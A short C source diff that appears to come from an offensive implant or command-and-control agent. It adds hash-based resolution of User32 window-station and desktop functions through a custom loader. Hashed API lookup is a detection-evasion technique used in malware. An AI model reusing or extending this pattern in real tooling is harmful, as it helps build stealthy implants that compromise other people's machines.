@@ -158,10 +158,18 @@ BOOL RtUser32(
 
     if ( ( Instance->Modules.User32 = LdrModuleLoad( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
-        Instance->Win32.ShowWindow       = LdrFunctionAddr( Instance->Modules.User32, H_FUNC_SHOWWINDOW );
-        Instance->Win32.GetSystemMetrics = LdrFunctionAddr( Instance->Modules.User32, H_FUNC_GETSYSTEMMETRICS );
-        Instance->Win32.GetDC            = LdrFunctionAddr( Instance->Modules.User32, H_FUNC_GETDC );
-        Instance->Win32.ReleaseDC        = LdrFunctionAddr( Instance->Modules.User32, H_FUNC_RELEASEDC );
+        Instance->Win32.ShowWindow              = LdrFunctionAddr( Instance->Modules.User32, H_FUNC_SHOWWINDOW );
+        Instance->Win32.GetSystemMetrics        = LdrFunctionAddr( Instance->Modules.User32, H_FUNC_GETSYSTEMMETRICS );
+        Instance->Win32.GetDC                   = LdrFunctionAddr( Instance->Modules.User32, H_FUNC_GETDC );
+        Instance->Win32.ReleaseDC               = LdrFunctionAddr( Instance->Modules.User32, H_FUNC_RELEASEDC );
+        Instance->Win32.OpenWindowStation       = LdrFunctionAddr( Instance->Modules.User32, H_FUNC_OPENWINDOWSTATION );
+        Instance->Win32.GetProcessWindowStation = LdrFunctionAddr( Instance->Modules.User32, H_FUNC_GETPROCESSWINDOWSTATION );
+        Instance->Win32.SetProcessWindowStation = LdrFunctionAddr( Instance->Modules.User32, H_FUNC_SETPROCESSWINDOWSTATION );
+        Instance->Win32.CloseWindowStation      = LdrFunctionAddr( Instance->Modules.User32, H_FUNC_CLOSEWINDOWSTATION );
+        Instance->Win32.OpenDesktopA            = LdrFunctionAddr( Instance->Modules.User32, H_FUNC_OPENDESKTOPA );
+        Instance->Win32.GetThreadDesktop        = LdrFunctionAddr( Instance->Modules.User32, H_FUNC_GETTHREADDESKTOP );
+        Instance->Win32.SetThreadDesktop        = LdrFunctionAddr( Instance->Modules.User32, H_FUNC_SETTHREADDESKTOP );
+        Instance->Win32.CloseDesktop            = LdrFunctionAddr( Instance->Modules.User32, H_FUNC_CLOSEDESKTOP );
 
         PUTS( "Loaded User32 functions" )
     } else {
